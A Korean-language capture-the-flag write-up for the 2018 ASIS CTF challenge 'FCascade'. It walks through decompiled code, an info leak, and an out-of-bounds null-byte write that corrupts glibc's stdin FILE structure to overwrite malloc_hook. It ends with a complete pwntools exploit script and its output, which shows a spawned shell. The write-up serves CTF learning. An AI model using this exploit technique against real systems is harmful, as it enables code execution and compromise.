# \[2018 ASIS CTF] \[Pwn] FCascade

## Keywords
- \_IO\_FILE / _IO\_2\_1\_stdin\_
- Out of Bound

## Checksec
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
`Full RELRO`가 걸려있습니다.

## Solution

main 함수이고

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+10h] [rbp-90h]
  unsigned __int64 v4; // [rsp+98h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  initialize();
  memset(&v3, 0, 0x80uLL);
  interaction(&v3);
}
```

interaction 함수 이고

```c
void __fastcall __noreturn interaction(char *a1)
{
  while ( 1 )
  {
    write(1, "> ", 2uLL);
    read(0, a1, 0x128uLL);
    if ( strncmp(a1, "11010110", 8uLL) || chk )
    {
      if ( !strncmp(a1, "10110101", 8uLL) )
        ccloud();
    }
    else
    {
      chk = 1;
      leak(a1);
    }
  }
}
```

leak함수 입니다.

```c
int __fastcall leak(void *a1)
{
  int result; // eax
  size_t length; // rax

  while ( 1 )
  {
    write(1, "> ", 2uLL);
    read(0, a1, 0x128uLL);
    result = strncmp((const char *)a1, "11111111", 8uLL);
    if ( !result )
      break;
    length = strlen((const char *)a1);
    write(1, a1, length);
  }
  return result;
}
```

이를 통해 Canary와 libc 주소를 leak할 수 있습니다.

버그는 ccloud 함수에서 발생합니다.

```c
void __noreturn ccloud()
{
  size_t size; // [rsp+18h] [rbp-18h]
  char *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  for ( buf = 0LL; ; free(buf) )
  {
    write(1, "> ", 2uLL);
    _isoc99_scanf((__int64)"%lu", (__int64)&size);
    getchar();
    buf = (char *)malloc(size);
    write(1, "> ", 2uLL);
    read(0, buf, size);
    buf[size - 1] = 0;
  }
}
```

size에 음수 값을 넣음으로서 OOB를 발생시킬 수 있습니다. 이를 통해 특정 주소에 null byte를 쓸 수 있습니다. 이걸로 뭘 할 수 있는지가 문제인데 \_IO\_FILE 구조체를 덮어 씌움으로써 Exploit이 가능합니다. scanf에서 해당 구조체를 참조하기 때문입니다. \_IO\_FILE 구조체는 다음과 같습니다.

```c
struct _IO_FILE {
  int _flags;           /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

gdb에서 메모리를 봅시다.

```
gdb-peda$ x/10x stdin
0x7ffff7dd18e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dd1963
0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:	0x00007ffff7dd1963	0x00007ffff7dd1963
0x7ffff7dd1900 <_IO_2_1_stdin_+32>:	0x00007ffff7dd1963	0x00007ffff7dd1963
// _IO_write_base, _IO_write_ptr
0x7ffff7dd1910 <_IO_2_1_stdin_+48>:	0x00007ffff7dd1963	0x00007ffff7dd1963
// _IO_write_end, _IO_buf_base
0x7ffff7dd1920 <_IO_2_1_stdin_+64>:	0x00007ffff7dd1964	0x0000000000000000
// _IO_buf_end
```

`_IO_write_base`가 0x7ffff7dd1900에 위치하고 있습니다. null byte writing를 통해 `_IO_buf_base` 값을 0x7ffff7dd1900로 변경합니다. 그러면 다음과 같이 구조체 값 전체가 변경됩니다.

```
gdb-peda$ x/10x stdin
0x7ffff7dd18e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dd1900
0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:	0x00007ffff7dd1900	0x00007ffff7dd1900
0x7ffff7dd1900 <_IO_2_1_stdin_+32>:	0x00007ffff7dd1900	0x00007ffff7dd1900
0x7ffff7dd1910 <_IO_2_1_stdin_+48>:	0x00007ffff7dd1900	0x00007ffff7dd1900
0x7ffff7dd1920 <_IO_2_1_stdin_+64>:	0x00007ffff7dd1964	0x0000000000000000
```

이제 scanf를 통해 입력받는 값은  0x7ffff7dd1900에 저장됩니다. 즉, scanf를 통해 입력이 들어오면 `_IO_write_base`에 저장됩니다. `_IO_write_base`에 free\_hook 또는 malloc\_hook을 써놓은 후 scanf를 통해 원샷가젯 주소나 system 함수의 주소를 입력하면 되겠죠?

## Exploit Code

```python
from pwn import *
import time

payload = "11010110" + "a" * 0x90

p = process("./fstream")
p.sendafter("> ", payload)
p.sendafter("> ", payload)	# leak libc address
p.recvuntil(payload)
leak      = u64(p.recvuntil("> ")[:-2].ljust(8,"\x00"))
libc_base = leak - 0x20830
log.info("leak      : 0x%x" % leak)
log.info("libc base : 0x%x" % libc_base)
p.sendline("11111111")

# null byte poisoning at _IO_buf_base
_IO_buf_base = libc_base + 0x3c4918
to_write_null = _IO_buf_base
calc_addr = -(0x10000000000000000 - to_write_null - 1)
p.sendafter("> ", "10110101")
p.sendlineafter("> ", str(calc_addr))
pause()

# overwrite _IO_buf_base with malloc_hook
malloc_hook = libc_base + 0x3c4b10
payload = p64(malloc_hook)*4 + p64(malloc_hook + 0x20) + p64(0)
p.sendafter("> ", payload)
pause()

# overwrite malloc_hook with one_gadget
one_gadget = libc_base + 0xf66f0
payload = "\x00"*16 + p64(one_gadget)
p.sendafter("> ", payload)
p.interactive()
```

## Result

```
$ python ex.py 
[+] Starting local process './fstream': pid 28599
[*] leak      : 0x7ffff7a2d830
[*] libc base : 0x7ffff7a0d000
[*] Paused (press any to continue)
[*] Paused (press any to continue)
[*] Switching to interactive mode
> > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > $ id
uid=1000(delspon) gid=1000(delspon) groups=1000(delspon),33(www-data)
```